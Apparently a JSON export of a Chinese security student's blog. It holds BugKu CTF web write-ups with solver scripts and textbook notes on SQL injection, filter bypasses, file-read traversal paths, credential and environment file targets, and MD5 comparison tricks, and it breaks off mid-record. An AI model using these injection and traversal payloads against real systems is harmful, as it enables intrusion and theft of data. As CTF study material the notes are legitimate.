{"pages":[{"title":"About","date":"2021-04-21T09:51:48.485Z","path":"about/index.html","text":"关于我自己如你所见，这是个简单的个人介绍。 常用ID Tsunamori，也可能简化为Tsu，名字灵感来自于常守朱（Akane Tsunemori）和飓风（tsunami）。起步缓慢型选手，但每天都在朝着目标努力中。 拥有一大只可可爱爱细心温柔又努力勤奋的开发男朋友 相对擅长的方向： Web渗透/机器学习/插件开发专业以外的特长： 流利的英语口语/为爱发电同人写手想要拓展的方向： pwn/AI security 知乎ID： VIVZCGitHub ID: Tsunamori 博客应该会主要用来整理学习笔记和构建自己的知识库吧，这也是为什么会选择wikitten的原因， wiki格式很合我心意。分类方式沿用了之前工作中构建知识库的模式，刚好解决了wikitten的排序问题。"},{"title":"Categories","date":"2021-04-08T08:19:12.672Z","path":"categories/index.html","text":"test1test2"},{"title":"Tags","date":"2021-04-08T06:52:07.056Z","path":"tags/index.html","text":""}],"posts":[{"title":"WP-BugKu-Web","date":"2021-05-08T03:43:54.000Z","path":"wiki/BugKu-WP/","text":"Web 18提示：题目刷新几次后有提示，需要计算数值并post value。 考点：爬虫复习、利用eval()直接计算string内的数字公式、利用同一个Session进行get和post请求，防止网页动态刷新计算值失效、post请求中data注意格式为{‘somevtext’：’somevalue’}、python和PHP的计算方式不太一样，可能存在计算偏差导致得不到flag，需要重复发送几次。 1234567891011121314151617181920import requestsfrom bs4 import BeautifulSoupurl &#x3D; &#39;http:&#x2F;&#x2F;114.67.246.176:14925&#x2F;&#39;s &#x3D; requests.session()r &#x3D; s.get(url)r.encoding &#x3D; &#39;utf-8&#39;soup&#x3D;BeautifulSoup(r.text,&#39;lxml&#39;)data&#x3D;soup.select(&#39;div&#39;)for item in data: #获取原文为804134448*284526014-53361872*1933492032+466213037-393751154*4253881+1224286171-1203351395*1548147628+1689398514&#x3D;?; result&#x3D;item.get_text()result1&#x3D;result[0:len(result)-3] #去掉后三位‘&#x3D;?;’result2 &#x3D; eval(result1) #计算数值result3&#x3D;&#123;&#39;value&#39;:result2&#125; #添加post请求数据格式mssg&#x3D;s.post(url, data&#x3D;result3) #利用同一个session，防止网页刷新。print(mssg.text) Web 19提示： OK ,now you have to post the margin what you find 解题思路：刷新几次之后没有发现变化，f12看network请求，在response包header内看到base64加密的flag，解码后为‘跑的还不错，给你flag吧: MjE0Nzg1’，一开始并没有意识到后面是base64的密文，直到一次运行爬虫发现密文有=号结尾。根据其他人的解读，说margin是数字所以提示了有两次base64解密，完全没有意识到这一层，我只猜到了post数据时数据格式为{‘margin’:xxx}，不得不说这提示的语法不太行，应该删掉what，这个着实困扰了。 这个解开之后就简单很多了，另一个难点是在py3里string无法直接用base64解密，需要先转换成ascii。以及解密之后的返回值为bytes，需要转换成utf-8格式再进行后续删减处理，不然有b’‘等噪音。 12345678910111213import base64import requestsurl&#x3D;&#39;http:&#x2F;&#x2F;114.67.246.176:19877&#x2F;&#39;s&#x3D;requests.session()r&#x3D;s.get(url).headers.get(&#39;flag&#39;)r1&#x3D;base64.b64decode(r.encode(&#39;ascii&#39;))r2&#x3D;r1.decode(&quot;utf-8&quot;)r3&#x3D;r2[len(r2)-8:len(r2)]r4&#x3D;base64.b64decode(r3.encode(&#39;ascii&#39;)).decode(&quot;utf-8&quot;)print(s.post(url, data&#x3D;&#123;&#39;margin&#39;:r4&#125;).text) Web 23题目： 12345678&lt;?phphighlight_file(&#39;2.php&#39;);$key&#x3D;&#39;flag&#123;********************************&#125;&#39;;$IM&#x3D; preg_match(&quot;&#x2F;key.*key.&#123;4,7&#125;key:\\&#x2F;.\\&#x2F;(.*key)[a-z][[:punct:]]&#x2F;i&quot;, trim($_GET[&quot;id&quot;]), $match);if( $IM )&#123; die(&#39;key is: &#39;.$key);&#125;?&gt; 解题思路：基本上难点都在这句正则上了，外加一个trim()去掉输入值前后的空白字符。解读一下php语句，就是当id的输入值符合正则时，退出（die）并返回key。2.php在此处仅为含有该php语句的文件（highlight_file），与输入值无关。跟着这道题试验了好几个找到的在线正则工具，发现还是regex101好用。/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i，&#123;4,7&#125;表示重复前面部分4～7次，[:punct:]为所有的特殊字符。payload：keykeykkeykey:/k/keya[:punct:] Web 24题目： 123456789101112&lt;?phpif(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123; $v1 &#x3D; $_GET[&#39;v1&#39;]; $v2 &#x3D; $_GET[&#39;v2&#39;]; $v3 &#x3D; $_GET[&#39;v3&#39;]; if($v1 !&#x3D; $v2 &amp;&amp; md5($v1) &#x3D;&#x3D; md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 解题思路：似曾相识的MD5相等题，此次应掏出MD5绕过笔记。strcmp(str1,str2),如果str1小于str2返回&lt;0；如果str1大于str2返回&gt;0；如果两者相等，返回0。因为是if(!xxx)返回flag，所以v3和flag相等。搜索strcmp绕过，可知当传入的类型非期望类型时，即传入值非string时，发生错误，返回0。如：数组,?a[]=2 Web 25提示：SQL约束攻击 解题思路：点开链接，发现是一个后台登录站点，先放着不管，查一下提示给的SQL约束攻击。内容也算似曾相识，之前在bug bounty的hint里面见过，也就是利用用户名长度限制，在用户名最后加上多个空白字符以及末尾一个用于绕过用户名是否已注册的对比的任意字符，那么在存储时，数据库仅存储前X位字符，导致攻击者可以取代登录目标用户。ref：https://www.freebuf.com/articles/web/124537.html知道了就简单了，思路是先盲猜管理员用户名，然后通过SQL约束攻击注册新帐号，取代替换原管理员帐号的密码。 Web 26提示：are you from google? 解题思路：这个提示已经很明显了，直接包头加转发（referer），表示自己是从google来的就行。突然在想x-forward-for为啥不行，查了一下XFF必须是IP地址。 Web 27提示： 1. please input a 2. md5 collision 解题思路：MD5碰撞，题面只有一句please input a，盲猜是输入a和某个值碰撞，那么首先试试输入数组报错法，回显false!!，起码证明思路应该是对的，重新查了查MD5碰撞，猜测题目是强类型不能绕过。但不知道另一个对比值要怎么做真实碰撞呢？好家伙，看了看提示，发现是没给对比值源码。。。行8 Web 28提示：请从本地访问。 解题思路：好的看到本地访问又稳了，直接开链接搞XFF。题目不但似曾相识还莫名的变简单了。。。我一般是上burp，不过在评论里看到一个curl -H &quot;X-Forwarded-For: 127.0.0.1&quot; http://114.67.246.176:18832/，码住。","tags":[{"name":"CTF, WriteUp","slug":"CTF-WriteUp","permalink":"https://tsunamori.github.io/tags/CTF-WriteUp/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"121 Web","slug":"100-Cyber-security/120-CTF/121-Web","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"}]},{"title":"CTF_IoT","date":"2021-04-29T09:34:18.000Z","path":"wiki/CTF_IoT/","text":"stm32https://www.anquanke.com/post/id/229321https://www.anquanke.com/post/id/231440","tags":[{"name":"CTF","slug":"CTF","permalink":"https://tsunamori.github.io/tags/CTF/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"128 IoT","slug":"100-Cyber-security/120-CTF/128-IoT","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/128-IoT/"}]},{"title":"ICS_CTF","date":"2021-04-29T07:05:16.000Z","path":"wiki/CTF_ICS/","text":"Modbus 赛题https://www.anquanke.com/post/id/185513 工控安全CTF 工具 网络数据包处理脚本 https://github.com/NewBee119/ctf_ics_traffic Modbus 脚本 https://github.com/arnaudsoullie/funwithmodbus0x5a","tags":[{"name":"CTF","slug":"CTF","permalink":"https://tsunamori.github.io/tags/CTF/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"128 ICS","slug":"100-Cyber-security/120-CTF/128-ICS","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/128-ICS/"}]},{"title":"车联网安全","date":"2021-04-28T08:50:20.000Z","path":"wiki/车联网安全/","text":"初识智能网联汽车安全 https://www.anquanke.com/post/id/230212","tags":[{"name":"IoT","slug":"IoT","permalink":"https://tsunamori.github.io/tags/IoT/"}],"categories":[{"name":"500 IoT security","slug":"500-IoT-security","permalink":"https://tsunamori.github.io/categories/500-IoT-security/"},{"name":"510 Automotive security","slug":"500-IoT-security/510-Automotive-security","permalink":"https://tsunamori.github.io/categories/500-IoT-security/510-Automotive-security/"}]},{"title":"工控安全","date":"2021-04-28T07:50:51.000Z","path":"wiki/工控安全/","text":"工控安全入门 工控安全从入门到实战 （一） https://www.anquanke.com/post/id/178265 （二） https://www.anquanke.com/post/id/178425 工控安全Wiki https://www.yuque.com/tidesec/ics 工控安全协议入门 Modbus 协议 https://www.anquanke.com/post/id/185513 S7comm 协议 https://www.anquanke.com/post/id/186099 https://www.anquanke.com/post/id/186587 DNP3协议 https://www.anquanke.com/post/id/187221 工控安全相关资源（协议数据包等） https://github.com/w3h/icsmaster 工控安全工具 ICS windows v2.0 https://www.anquanke.com/post/id/227645 （含工具列表） 实验室 工控安全-灯塔实验室 http://plcscan.org/blog/category/%E5%B7%A5%E6%8E%A7%E5%AE%89%E5%85%A8/ 工控安全-Tide安全团队 http://www.tidesec.net/","tags":[{"name":"ICS","slug":"ICS","permalink":"https://tsunamori.github.io/tags/ICS/"}],"categories":[{"name":"400 ICS security","slug":"400-ICS-security","permalink":"https://tsunamori.github.io/categories/400-ICS-security/"}]},{"title":"近源渗透","date":"2021-04-28T07:05:26.000Z","path":"wiki/近源渗透/","text":"红蓝对抗中的近源渗透 https://security.tencent.com/index.php/blog/msg/167","tags":[{"name":"Summary","slug":"Summary","permalink":"https://tsunamori.github.io/tags/Summary/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"112 Ideas","slug":"100-Cyber-security/110-Bug-bounty/112-Ideas","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"}]},{"title":"0 to 1 the road of CTFer 第一章 Web入门","date":"2021-04-26T05:49:07.000Z","path":"wiki/Notes_0-to-1-the-road-of-CTFer_1/","text":"第一章 Web入门信息收集敏感信息泄漏git泄漏 常规git泄漏：flag在源码内，可直接利用工具或脚本获取。 git回滚：flag被修改，但依然保存在commit记录里。 利用git reset --hard [版本号]获取flag。 更简单的方法是通过git log-stat查看每个commit修改了哪些文件，再用git diff HEAD [commit-id]比较当前版本和想看的commit之间的变化。 git分支：命令git reflog查看分支间切换的记录。从原url下载分支内容并恢复（目前的恢复分支记录需要下载分支HEAD并修改GitHacker.py代码实现自动恢复分支，先简单记录下来，后续看是否有其它更简单的方式。） git stash：stash是对当前工作的“保存”，以备后续恢复。git stash list查看保存的列表，git stash pop恢复工作现场，git stash show显示做了哪些改动。 git index：index是暂存区，用于通过git add .命令暂存新建文件等待commit。使用git checkout-index命令恢复文件。 git泄漏的其他利用方式：泄漏的git中也可能有其他有用的信息。 .git/config文件夹中可能含有access_token信息，从而访问该用户的其它仓库。 SVN泄漏SVN是源代码版本管理软件，如果存在泄漏，可以利用.svn/entries或wc.db文件获取服务器源码等信息。 https://github.com/kost/dvcs-ripper Seay-svn（Win） HG泄漏.hg隐藏文件中包含代码和分支修改记录等信息。 https://github.com/kost/dvcs-ripper 总结CTF线上赛往往会有重定向的问题，例如，只要访问.git便会返回403,此时访问.git/config，如果有文件内容返回，说明存在git泄漏，反之，一般不存在。而在SVN泄漏中，一般是在entries中爬取源代码，但有时会出现entries为空的情况，这时注意wc.db文件存在与否，便可通过其中的checksum在pristine文件夹中获取源代码。 敏感备份文件gedit备份文件在Linux下，用gedit编辑器保存文件后，当前目录下会生成一个[文件名]~的备份文件，访问这个文件即可获得文件内容。 vim备份文件vim在意外退出时会生成一个备份文件，文件名格式为.filename.swp，再次生成备份文件时则为.filename.swo，第三次为.filename.swn，以此类推。恢复备份的办法是，先在当前目录下创建一个flag文件，再使用vim-r flag，即可恢复.flag.swp。 常规文件主要靠丰富字典。(dirsearch+自己收集字典) phpinfo() 备份文件后缀1234567891011121314151617181920212223242526272829back.rarback.tarback.tar.gzback.zipbackup.rarbackup.tarbackup.tar.gzbackup.ziptemp.rartemp.tartemp.tar.gztemp.zipweb.rarweb.tarweb.tar.gzweb.zipwebsite.rarwebsite.tarwebsite.tar.gzwebsite.zipwww.rarwww.tarwww.tar.gzwww.zipwwwroot.rarwwwroot.tarwwwroot.tar.gzwwwroot.zipindex.php.bak 总结线上赛过程中，出题人往往会在线运维题目，有时会导致swp备份文件的生成。所以读者在比赛过程中可以编写实时监控脚本，对题目服务进行监控。 Banner识别在线上赛中，网站的Banner对解题有着十分重要的作用，选手往往可以通过Banner信息来获得解题思路。如得知网站是用ThinkPHP的Web框架编写时，我们可以尝试ThinkPHP框架的相关历史漏洞。或者得知这个网站是Windows服务器，那么我们在测试上传漏洞时可以根据Windows的特性进行尝试。 自行收集指纹库 Github CMS指纹库 扫描器识别 使用已有工具 Wappalyzer（pip install python-Wappalyzer）：在data目录下，apps.json是其规则库，读者可以根据自己需求自由添加。 总结除了以上两种识别方式，我们还可以通过随意输入一些URL，观察404和302跳转页面中是否包含CMS及版本号。 CTF中的SQL注入SQL注入（mysql）数字型注入test.php?id=2 -&gt; true。返回记录。test.php?id=3-1 -&gt; true，返回id=2的记录。说明mysql对3-1进行了计算，从数字运算这个特征可以判断该注入点为数字型注入，输入点$_GET[‘id’]附近没有引号包裹，可以直接输入SQL查询语句。 mysql查询出两行记录（union select联合查询注入）但PHP源码限制只能显示一行记录的办法： 1. 在原有数据后面加上limit 1,1参数，显示查询结果的第二条记录。 1. 指定id=-1或一个很大的值，使第一条数据无法被查询到。（常用） 字符型注入与数字型注入相比，只是在GET参数输入的地方包裹了单引号（少部分情况为双引号）让其变成字符串。在MySQL中，等号两边如果类型不一致则会发生强制转换，当数字和字符串数据比较时，字符串将被转换为数字再进行比较。test.php?id=3-2，无返回结果，证明注入点不是数字型。继续尝试test.php?id=2a，返回id=2的结果，证明存在字符型注入。 1. 尝试使用单引号闭合前面的单引号，（插入查询语句），再用`--%20`或`%23`注释后面的语句，注意在URL框输入时，`-- `和`#`以及`&#39;&#39;`要进行URL编码。 1. 除了注释，也可以使用单引号来闭合后面的单引号，eg: test.php?id=2&#39;union select xxx &#39; 布尔盲注test.php?id=1’and’f’=’a’，猜中则返回id=1内容更快的方法为 test.php?id=1’and’f’&lt;’n’，二分法。如何获取每一位字符？利用mysql的substring(),mid(),substr()等。 时间盲注php?id=1’or sleep(10) 报错注入mysql会将语句执行后的报错信息输出。updatexml在执行时，第二个参数应该为合法的XPATH路径，否则会在引发报错时输出传入的参数。id=’1’ or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)updatexml()报错注入，ref: https://blog.csdn.net/qq_37873738/article/details/88042610 堆叠注入当目标开启多语句执行时，可以采用多语句执行的方式修改数据库结构和数据。 注入点注入点在select_exprAS别名：id=(select%20pwd%20from%20wp_user)%20as%20title 注入点在table_reference仍可以用别名取出数据：SELECT title FROM (SELECT pwd AS title FROM wp_user)x; 在该两处的注入，如果注入点有反引号包裹，那么需要先闭合反引号。 注入点在WHERE或HAVING后代码：$res = mysqli_query($conn, &quot;SELECT title FROM wp_news WHERE id = $&#123;_GET[id]&#125;&quot;);现实中最常遇到的情况，要先判断有无引号包裹，再闭合前面可能存在的括号，即可进行注入来获取数据。 注入点在HAVING后的情况与之类似。 注入点在GROUP BY或ORDER BY后当遇到不是WHERE后的注入点时，先在本地MySQL中进行尝试，看语句后面能加什么，从而判断当前可以注入的位置，进而进行有针对的注入。 假设代码如下：$res = mysqli_query($conn, &quot;SELECT title FROM wp_news GROUP BY $&#123;_GET[&#39;title&#39;]&#125;&quot;);测试可得，title=id desc,(if(1,sleep(1),1))，可以利用时间注入获取数据。 1事实上只要对输入值进行白名单比对，基本就能防御这种注入。 注入点在LIMIT后该注入比较简单，通过更改数字大小，页面会显示更多或更少的记录数。由于语法限制，LIMIT后只能是数字，在整个SQL语句没有ORDER BY关键字的情况下，可以直接使用UNION注入。另外可以根据SELECT语法，通过加入PROCEDURE来尝试注入（只适用于MySQL 5.6前的版本） INSERT注入通常注入位于字段名或字段值的地方，且没有回显信息。 注入点位于tbl_name如果能够通过注释符注释后续语句，则可直接插入特定数据到想要的表内，如管理员表。 注入点位于VALUESUPDATE注入DELETE注入对id参数进行注入时，如果使WHERE后的值变为true，数据就会被删除。为了保证正常数据不会被干扰，通常使用and sleep (1)保证WHERE后的结果返回为false，让语句无法成功执行，后续步骤参考时间盲注。 注入防御及绕过思路其它ref：https://blog.csdn.net/wy_97/article/details/78085664 关键字替换或匹配拦截过滤空格替代空格的空白符有：%0a, %0b, %0c, %0d, %09, %a0（均为URL编码，%a0在特定字符集才能利用）和/**/组合、括号等。 将SELECT替换成空可以采用嵌套的方式，如SESELECTLECT。 大小写匹配在MySQL中，关键字是不区分大小写的，如果只匹配了SELECT就可以通过大小写混写的方式绕过。 正则匹配正则匹配关键字\\bselect\\b可以用形如/*!50000select*/的方式绕过。 替换了单引号或双引号，没有过滤反斜杠id=&#39;a\\&#39; AND title = &#39;OR sleep(1)#&#39;反斜杠转义了预置的单引号，实现绕过。 逃逸引号编码解码当用户输入待转义函数时，如果数据处于编码状态则引号无法被转义。同样的情况也发生在加密/解密、字符集转换的情况。 宽字节注入 意料之外的输入点被遗漏的可控点，例如PHP中，上传的文件名、http header、$_SERVER[‘PHP_SELF’] 等变量。 二次注入由于开发者信任数据库中取出的数据是无害的，从而导致二次注入漏洞的出现。 用户名为admin&#39;or&#39;1 字符串截断在标题、抬头等位置，开发者可能限制其字符不能超过x个字符，超过就会被截断。假如攻击者输入aaaa&#39;，自动转义为aaaa\\&#39;，由于长度限制被截取为aaaa\\，正好转义预置的单引号，实现注入。 注入应用 在有写文件权限的情况下，直接用INTO OUTFILE或DUMPFILE向Web目录写文件，或写文件后结合文件包含漏洞实现代码执行。ref:https://baijiahao.baidu.com/s?id=1650711425682220792&amp;wfr=spider&amp;for=pc 在有读文件权限的情况下，用load_file()函数读取网站源码和配置信息，获取敏感数据。 提升权限，绕过登录，添加用户，调整用户权限。 通过数据，控制如缓存、模板等文件内容来获取权限，或者删除、读取某些关键文件。 在可以执行多语句的情况下，控制整个数据库，包括控制任意数据、任意字段长度等。 在SQL Server这类数据库中可以直接执行系统命令。 总结实际比赛中，应根据不同的SQL服务器类型查找相关资料，通过fuzz得出被过滤的字符、函数、关键词等，在文档中查找未过滤的替代，完成绕过。 练习靶场：github-sqli-labs 任意文件读取漏洞文件读取漏洞常见触发点PHP有关文件读取的标准函数（审计中重点关注）。包括但不限于： file_get_contents(),file(),fopen()函数，(及其文件指针操作函数fread(),fgets()等); 与文件包含相关的函数include(),require(),include_once(),require_once()等; 通过PHP读文件的执行系统命令：system(),exec()等。PHP扩展中读取文件的函数： php-curl扩展 XML模块XXE 相关源码阅读：Wrapper和Filter PHP文件包含的实际问题： 1. 文件路径前面可控，后面不可控：在较低PHP及容器版本中可以使用\\x00截断，对应的URL编码是%00。当服务端存在文件上传功能时，也可以尝试利用zip或phar协议直接进行文件包含执行PHP代码。 1. 文件路径后面可控，前面不可控：通过../进行目录穿越读取文件，但这种情况无法使用Wrapper，如果服务器是利用include等文件包含类的函数，将无法读取PHP文件中的PHP代码。 1. 文件路径中间可控：和第一种相似，但无法利用Wrapper进行文件包含。 Python漏洞经常出现在框架请求静态资源文件部分，也就是最后读取文件内容的open函数。但直接导致漏洞的原因往往是Python函数的feature被忽略。 除了Python框架，很多其它涉及文件操作的应用也可能因为滥用open函数、模板的不当渲染导致任意文件读取。 JAVA 文件读取函数FileInputStream XXE JAVA模块所支持的file://协议 Spring Cloud Config Server 路径穿越与任意文件读取漏洞 CVE-2019-3799, Jenkins 任意文件读取漏洞 CVE-2018-1999002 Ruby 通常与Rails框架相关。 Ruby on Rails 远程代码执行漏洞 CVE-2016-0752，Ruby on Rails 路径穿越与任意文件读取漏洞 CVE-2018-3760，Ruby on Rails 路径穿越与任意文件读取漏洞 CVE-2019-5418 Node 通常为模板注入、代码注入等。 Node.js express 模块任意文件读取漏洞 CVE-2017-14849 中间件/服务器相关Nginx错误配置常搭配Python-Web应用一起出现。 /static../ -&gt; /home/myapp/static/../，产生目录穿越，穿越至myapp目录。原因：location最后没有加‘/’限制123location &#x2F;static &#123; alias &#x2F;home&#x2F;myapp&#x2F;static&#x2F;;&#125; 数据库MySQL： load_file(),利用条件严格，但仍然常出相关文件读取题目。 load data infile，需要执行完整的SQL语句且需要FILE权限，比较少见，除了SSRF攻击MySQL以外，很少能够直接执行整条非基本SQL语句的机会。 软链接又称符号链接，即soft link或symbolic link。相当于win下的快捷方式。 硬链接与软链接的区别： https://www.jianshu.com/p/b035d94fa959 bash命令ln-s可以创建一个指向指定文件的软链接文件，然后将该文件上传至服务器，访问该链接文件时，实际上是在请求服务端它指向的文件。 FFmpegCISCN 2017 FFmpeg 任意文件读取漏洞 Doker-APIDocker-API可以控制Docker的行为，Docker-API通过UNIX Socket通信，也可以通过HTTP直接通信。当可以通过SSRF漏洞进行UNIX Socket通信时，就可以通过操纵Docker-API把本地文件载入Docker新容器进行读取（利用Docker的ADD、COPY操作）。 客户端相关客户端文件读取漏洞，大多基于XSS读取本地文件。 浏览器/Flash XSSjs读取本地文件 Safari浏览器 客户端本地文件读取漏洞 MarkDown语法解析器XSS具有解析js的能力，且缺乏浏览器的读取本地文件限制。 文件读取漏洞常见读取路径Linuxflag名称（相对路径）fuzz方式获取 123456789..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag(.txt|.php|.pyc|.py ...)flag(.txt|.php|.pyc|.py ...)[dir_you_know]&#x2F;flag(.txt|.php|.pyc|.py ...)..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;flag(.txt|.php|.pyc|.py ...)..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;flag(.txt|.php|.pyc|.py ...)..&#x2F;flag(.txt|.php|.pyc|.py ...)..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;root&#x2F;flag(.txt|.php|.pyc|.py ...)..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;flag(.txt|.php|.pyc|.py ...)..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;home&#x2F;[user_you_know]&#x2F;flag(.txt|.php|.pyc|.py ...) 服务器信息（绝对路径）CTF中常见的部分须知目录和文件 /etc目录 多是各种应用或系统配置文件，是进行文件读取的首要目标。 /etc/passwd （详细解析：http://c.biancheng.net/view/839.html） Linux系统保存用户信息及其工作目录的文件，所有用户/组可读，一般用作Linux系统下文件读取漏洞存在判断的基准。从该文件可得系统中存在哪些用户，及其所属组和工作目录。 /etc/shadow （详细解析： http://c.biancheng.net/view/840.html） 是Linux系统保存用户信息及（可能存在）密码（hash）的文件，权限是root用户可读写、shadow组可读。所以一般情况下该文件不可读。 /etc/apache2/* 是Apache的配置文件，可以获知Web目录、服务端口等信息。 /etc/nginx/* 是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。 /etc/apparmor(.d)/* 是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。（如查看MySQL是否禁用系统调用，确定是否可以使用UDF执行系统命令） /etc/(cron.d/*|crontab) 是定时任务文件。有些题会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其它文件。 /etc/environment 是环境变量配置文件之一。环境变量可能存在大量目录信息的泄漏，甚至可能出现secret key泄漏的情况。 /etc/hostname 主机名 /etc/hosts 主机名查询静态表，包含知道域名解析IP的成对信息。通过该文件，可以探测网卡信息和内网IP/域名。 /etc/issue 指明系统版本。 /etc/mysql/* MySQL配置文件。 /etc/php/* PHP配置文件。 /proc目录 通常存储进程动态运行的各种信息，本质上是一种虚拟目录。 如果查看非当前进程的信息，pid是可以暴力破解的，如果要查看当前进程，只需/proc/self/代替/proc/[pid]/即可。 对应目录下的cmdline可读出比较敏感的信息。/proc/[pid]/cmdline 有时我们无法获取当前应用所在的目录，通过cwd命令可以直接跳转到当前目录。/proc/[pid]/cwd/ 环境变量中可能存在secret_key，也可以通过environ读取。/proc/[pid]/environ 其它目录","tags":[{"name":"Notes","slug":"Notes","permalink":"https://tsunamori.github.io/tags/Notes/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"110 Bug bounty","slug":"100-Cyber-security/110-Bug-bounty","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"},{"name":"119 Notes","slug":"100-Cyber-security/110-Bug-bounty/119-Notes","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/119-Notes/"}]},{"title":"CTF SQLI","date":"2021-04-25T09:12:07.000Z","path":"wiki/CTF_SQLI/","text":"手注流程 页面里有一个POST表单，测试会不会有注入漏洞 POST里 id=1’和id=1’# id=1’ and 1=2#和id=1’ and 1=1# 前一个不回显后一个回显，那么说明存在注入。 判断字段数：有四个字段 id=1’ order by 4# 判断回显位： id=1’ union select 1,2,3,4# 有正常回显 id=1’ union select 1,2,3# 无回显，证明该数据库在第四位，查询该数据库名 id=0’ union select 1,2,3,database()# 查到表名为skctf，继续查数据表（tables）名 id=0’ union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=’skctf’# id=0’ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=’fl4g’# 查询数据： id=0’ union select 1,2,3,skctf_flag from fl4g# 得到flag。","tags":[{"name":"CTF","slug":"CTF","permalink":"https://tsunamori.github.io/tags/CTF/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"121 Web","slug":"100-Cyber-security/120-CTF/121-Web","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"}]},{"title":"CTF MD5","date":"2021-04-25T02:30:06.000Z","path":"wiki/CTF_MD5/","text":"MD5()函数数组绕过 123456789101112131415&lt;?include_once “flag.php”;ini_set(“display_errors”, 0);$str &#x3D; strstr($_SERVER[‘REQUEST_URI’], ‘?’);&#x2F;&#x2F;返回$_SERVER[‘REQUEST_URI’]内从‘?’后开始的值。$str &#x3D; substr($str,1);$str &#x3D; str_replace(‘key’,”,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123;echo $flag.”取得flag”;&#125;?&gt; 绕过方法： 对key关键词的过滤可以用kekeyy绕过，从而传递key1&amp;key2进行比较。 md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。 利用==比较漏洞,如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。下列的字符串的MD5值都是0e开头的：QNKCDZO240610708s878926199as155964671as214587387as214587387a ref: https://blog.csdn.net/zpy1998zpy/article/details/80582974 MD5碰撞严格比较（非弱类型绕过）构造前缀碰撞法”（chosen-prefix collisions）https://xz.aliyun.com/t/2232","tags":[{"name":"CTF","slug":"CTF","permalink":"https://tsunamori.github.io/tags/CTF/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 CTF","slug":"100-Cyber-security/120-CTF","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/"},{"name":"121 Web","slug":"100-Cyber-security/120-CTF/121-Web","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/120-CTF/121-Web/"}]},{"title":"CTF back-up-logs","date":"2021-04-25T02:09:20.000Z","path":"wiki/CTF_back-up-logs/","text":"文件后缀back.rarback.tarback.tar.gzback.zipbackup.rarbackup.tarbackup.tar.gzbackup.ziptemp.rartemp.tartemp.tar.gztemp.zipweb.rarweb.tarweb.tar.gzweb.zipwebsite.rarwebsite.tarwebsite.tar.gzwebsite.zipwww.rarwww.tarwww.tar.gzwww.zipwwwroot.rarwwwroot.tarwwwroot.tar.gzwwwroot.zipindex.php.bak 日志分析https://www.freebuf.com/sectool/202350.html","tags":[{"name":"CTF","slug":"CTF","permalink":"https://tsunamori.github.io/tags/CTF/"}],"categories":[{"name":"100 Cyber security","slug":"100-Cyber-security","permalink":"https://tsunamori.github.io/categories/100-Cyber-security/"},{"name":"120 